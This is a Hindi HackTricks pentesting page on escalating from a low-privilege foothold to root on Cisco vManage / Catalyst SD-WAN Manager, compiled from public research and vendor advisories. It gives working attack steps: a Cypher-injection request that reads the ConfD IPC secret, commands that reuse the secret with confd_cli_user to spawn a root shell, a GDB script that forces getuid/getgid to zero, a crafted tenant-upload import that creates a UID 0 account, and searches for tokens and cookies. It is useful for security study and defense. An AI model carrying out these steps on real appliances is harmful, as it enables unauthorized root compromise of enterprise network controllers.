# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

एक बार Cisco vManage / *Catalyst SD-WAN Manager* पर `vmanage`, `netadmin`, या `vmanage-admin` के रूप में code execution मिल जाने के बाद, सबसे दिलचस्प local privesc surfaces आमतौर पर `confd` CLI stack, `cmdptywrapper` helper, localhost REST APIs, और root-owned import/upload handlers होते हैं।

यदि आपको अभी भी किसी controller पर **initial foothold** की आवश्यकता है, तो पहले dedicated control-plane page देखें:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## त्वरित local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
यदि आपके foothold से `/etc/confd/confd_ipc_secret` पढ़ने योग्य है, तो Path 1 और Path 2 तुरंत व्यावहारिक हो जाते हैं। यदि आप remote file disclosure या webshell के माध्यम से पहुंचते हैं, तो `vmanage-admin` SSH material और multitenancy upload handlers की भी जांच करें; हालिया research ने दोनों को viable pivots के रूप में प्रदर्शित किया है।<sup>[[3]](#references)[[4]](#references)</sup>

## Path 1

Synacktiv का vManage assessment इस root-shell path का दस्तावेजीकरण करता है।<sup>[[5]](#references)</sup>

रिपोर्ट में linked [ConfD documentation](http://66.218.245.39/doc/html/rn03re18.html) IPC authentication का वर्णन करता है; इसका vManage example secret को `/etc/confd/confd_ipc_secret` पर रखता है और दिखाता है कि यह `vmanage` द्वारा पढ़ने योग्य है।<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
क्योंकि रिपोर्ट किए गए setup में Neo4j `vmanage` privileges के साथ चलता है, पहले बताई गई Cypher injection secret file को पढ़ सकती है।<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` स्वयं command-line arguments स्वीकार नहीं करता; यह `/usr/bin/confd_cli_user` को invoke करता है। रिपोर्ट किया गया workflow उस root-readable helper को rootfs से extract करता है, उसे `scp` के माध्यम से copy करता है, उसकी help पढ़ता है, `CONFD_IPC_ACCESS_FILE` सेट करता है, और root shell प्राप्त करने के लिए इसे `-U 0 -G 0` के साथ call करता है।<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

यह वैकल्पिक मार्ग Walmart Global Tech के vManage 19.2.2 research से अनुकूलित है।<sup>[[6]](#references)</sup>

Synacktiv path में `/usr/bin/confd_cli_user` की एक copy आवश्यक है, जो reported setup में root-readable है; Walmart report इसके बजाय GDB के अंतर्गत `confd_cli` के identity values को बदलती है।<sup>[[5]](#references)[[6]](#references)</sup>

Report का disassembly दिखाता है कि `confd_cli` caller का UID और GID एकत्र करता है।<sup>[[6]](#references)</sup>

<details>
<summary>UID/GID collection दिखाने वाला Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
वही परीक्षण root के स्वामित्व वाले `cmdptywrapper` को स्पष्ट रूप से दिए गए `-g` और `-u` मान प्राप्त होते हुए दिखाता है।<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
शोधकर्ता ने अनुमान लगाया कि `confd_cli`, लॉग-इन किए गए user का UID और GID `cmdptywrapper` को forward करता है।<sup>[[6]](#references)</sup>

`cmdptywrapper` को सीधे `-g 0 -u 0` के साथ चलाना विफल रहा, क्योंकि आवश्यक file descriptor (`उदाहरण में -i 1015`) उपलब्ध नहीं था।<sup>[[6]](#references)</sup>

क्योंकि `confd_cli` इन values को arguments के रूप में expose नहीं करता, report में `getuid()` और `getgid()` के return values को override करने के लिए GDB का उपयोग किया गया; उस appliance पर GDB मौजूद था।<sup>[[5]](#references)[[6]](#references)</sup>

`vmanage` access के साथ, test `/etc/confd/confd_ipc_secret` को पढ़ सका; निम्नलिखित script दोनों identity calls को zero return करने के लिए बाध्य करती है।<sup>[[6]](#references)</sup>

Report में उपयोग की गई GDB script है:<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
रिपोर्ट किया गया console output है:<sup>[[6]](#references)</sup>

<details>
<summary>Console output</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco ने बाद में [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) के लिए अपनी advisory में एक अधिक साफ़ local root path documented किया। **केवल read-only privileges वाला authenticated attacker** अपर्याप्त input validation के कारण manager CLI को crafted request भेजकर root प्राप्त कर सकता था।<sup>[[7]](#references)</sup>

Offensive perspective से, यह advisory और पहले का CLI research निम्न workflow सुझाते हैं।<sup>[[6]](#references)[[7]](#references)</sup>

1. जैसे ही box पर आपको *कोई भी* low-priv foothold मिल जाए, भारी Path 1 / Path 2 workflow अपनाने से पहले local CLI service को test करें।
2. Trust boundary खोजने के लिए Path 2 के artifacts का पुनः उपयोग करें: `confd_cli` → `cmdptywrapper` → `vshell`।
3. CLI backend को forward किए जाने वाले हर field को suspicious मानें: UID/GID, username, terminal metadata, imported files, या root-owned helper द्वारा बाद में consume की जाने वाली कोई भी value।
4. यदि कोई low-priv user local CLI socket तक पहुंच सकता है और इन fields को influence कर सकता है, तो root केवल एक crafted request की दूरी पर हो सकता है।

Appliance पर पहुंचने के बाद, local CLI chain का निरीक्षण इस प्रकार करें।<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
यह 2025 bug को एक reusable hunting pattern में बदल देता है: ऐसे **local CLI shims** खोजें जो userland में identity collect करते हैं और उसे एक privileged wrapper को forward करते हैं।<sup>[[6]](#references)[[7]](#references)</sup>

**CVE-2025-20122** को बाद के **CVE-2026-20122** के साथ confuse न करें: 2025 की समस्या एक *local* CLI-to-root bug है, जबकि 2026 की समस्या एक *remote* API arbitrary file overwrite है, जिसका मुख्य उपयोग foothold स्थापित करने और फिर Path 1 / Path 2 / Path 4 पर वापस जाने के लिए होता है।<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco की February 2026 advisory एक अन्य उपयोगी privesc class, [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v), का वर्णन करती है। एक **authenticated, local attacker with low privileges**, REST API में insufficient user-authentication mechanism के कारण root प्राप्त कर सकता था।<sup>[[1]](#references)</sup>

यह महत्वपूर्ण है क्योंकि vManage privesc अब केवल `confd`/TTY abuse तक सीमित नहीं है; low-priv shell मिलने के बाद निम्नलिखित को भी hunt करें।<sup>[[1]](#references)</sup>

- localhost-only API endpoints जो caller पर अत्यधिक trust करते हैं
- वर्तमान account से readable tokens, cookies या service credentials
- `dataservice`/REST handlers के माध्यम से exposed root-only actions, जिन्हें अभी भी locally trigger किया जा सकता है

व्यवहार में, एक बार `vmanage` या किसी अन्य service user के रूप में shell मिल जाने पर, local API abuse को interactive CLI abuse की तुलना में automate करना आसान हो सकता है।<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
यदि स्थानीय session context privileged REST functionality तक पहुंचने के लिए पर्याप्त है, तो API path को प्राथमिकता दें: इसे replay, script और चुराए गए web sessions या API tokens के साथ chain करना आसान होता है।<sup>[[1]](#references)</sup>

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

एक अन्य हालिया pattern [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx) है। `netadmin` privileges वाला local attacker एक **crafted file** upload कर सकता था, जिसे CLI बाद में असुरक्षित तरीके से handle करता था, जिसके परिणामस्वरूप `root` के रूप में command injection हो सकता था।<sup>[[2]](#references)</sup>

HackTricks के दृष्टिकोण से, मूल्यवान technique specific CVE से व्यापक है।<sup>[[2]](#references)</sup>

1. ऐसी प्रत्येक CLI या web workflow को enumerate करें जो कोई file स्वीकार करती है: imports, diagnostic bundles, templates, validators, backups, tenant data आदि।
2. Trace करें कि uploaded file कहां पहुंचती है और कौन-सी root-owned script या binary उसे consume करती है।
3. Test करें कि क्या filename, file content या parsed metadata को कभी shell commands, wrapper scripts या `system()`-style helpers में pass किया जाता है।
4. यदि आप पहले से `netadmin` तक पहुंच सकते हैं (valid creds, stolen session या auth-bypass chain के माध्यम से), तो file-processing bugs अक्सर root तक पहुंचने का सबसे तेज path होते हैं।

Google Cloud / Mandiant ने बाद में इस bug class का एक concrete instance दिखाया, जिसे multitenancy import path के माध्यम से exploit किया गया था।<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
देखे गए attack में, crafted CSV ने `/etc/passwd` और `/etc/shadow` को संशोधित करके एक अस्थायी UID 0 account (`troot`) बनाया। इससे `tenant-upload` / `tenant-list` style importers विशेष रूप से दिलचस्प हो जाते हैं: ये केवल data-ingestion features नहीं हैं, बल्कि संभावित root-owned parser front-ends हैं।<sup>[[4]](#references)</sup>

shell-side hunting pattern इस प्रकार है:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
यह bug class उन remote footholds के साथ विशेष रूप से अच्छी तरह chain होती है जो `netadmin` प्रदान करते हैं, लेकिन `root` नहीं।<sup>[[2]](#references)[[4]](#references)</sup>

## vManage/Catalyst SD-WAN Manager की अन्य हाल की vulns जिन्हें chain किया जा सकता है

- **Unauthenticated info leak (CVE-2026-20133)** – यह विशेष रूप से high-value है क्योंकि public research से पता चला कि इससे `confd_ipc_secret` या `vmanage-admin` private key expose हो सकती है, जिससे read bug को Path 1 या NETCONF pivot में बदला जा सकता है।<sup>[[3]](#references)</sup>
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – यह ऊपर दिए गए 2025 CLI bug से अलग है; VulnCheck ने इसका उपयोग webshell upload करने के लिए किया, जिससे इस page पर दिए गए local privesc paths तुरंत relevant हो जाते हैं।<sup>[[3]](#references)</sup>
- **Authenticated UI XSS (CVE-2024-20475)** – एक authenticated attacker प्रभावित user के web interface में script execute कर सकता है; assess करें कि resulting session context ऐसे API/CLI actions expose करता है या नहीं, जो `vshell` या ऊपर दिए गए local privesc paths तक पहुंचते हों।<sup>[[9]](#references)</sup>
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Path 5 के लिए यह बहुत मजबूत precursor है क्योंकि 2026 crafted-file privesc के लिए आवश्यक level ठीक `netadmin` ही है।<sup>[[2]](#references)[[3]](#references)</sup>
- **Authenticated arbitrary file write (CVE-2026-20262)** – इसका offensive value CVE-2026-20122 के समान है, लेकिन यह बाद के web UI upload path के माध्यम से होता है; Cisco के अनुसार bug द्वारा बनाई या overwrite की गई file का बाद में root तक elevate करने के लिए उपयोग किया जा सकता है।<sup>[[10]](#references)</sup>
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 intrusions से पता चला कि attackers पुराने vulnerable SD-WAN build पर rollback कर सकते हैं, पुराने CLI root bug का abuse कर सकते हैं और फिर original version restore कर सकते हैं।<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – इसका बेहतर documentation dedicated SD-WAN control-plane page में है; इससे `vmanage-admin` के लिए SSH key append की जा सकती है, जो आगे के management-plane actions के लिए persistent NETCONF access प्रदान करती है।<sup>[[11]](#references)</sup>



## References

- [1] [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, और Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Cats को Herd करना - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Cisco Catalyst SD-WAN Manager में Vulnerability (CVE-2026-20245) का Zero-Day Exploitation](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN Part 1: vManage पर Attacking](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — CSRF से Remote Code Execution तक](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [UAT-8616 द्वारा Cisco Catalyst SD-WAN का Active exploitation (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Cisco Catalyst SD-WAN Manager Arbitrary File Write Vulnerability (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7: CVE-2026-20182 - Cisco Catalyst SD-WAN Controller में Critical authentication bypass](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
